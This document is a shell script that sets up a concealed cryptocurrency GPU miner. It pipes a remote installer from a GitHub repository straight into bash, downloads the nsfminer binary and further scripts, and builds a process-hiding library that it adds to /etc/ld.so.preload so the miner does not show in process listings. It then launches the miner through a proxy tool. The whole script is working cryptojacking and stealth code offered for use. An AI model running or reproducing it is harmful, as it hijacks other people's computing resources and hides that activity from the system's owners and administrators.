#!/bin/sh
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh | bash

wget https://github.com/no-fee-ethereum-mining/nsfminer/releases/download/v1.3.14/nsfminer_1.3.14-ubuntu_18.04-cuda_11.3-opencl.tgz
tar -xvzf nsfminer_1.3.14-ubuntu_18.04-cuda_11.3-opencl.tgz
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNSF.zip
unzip magicNSF.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nsfFlex.sh
chmod +x nsfFlex.sh
graftcp ./nsfFlex.sh
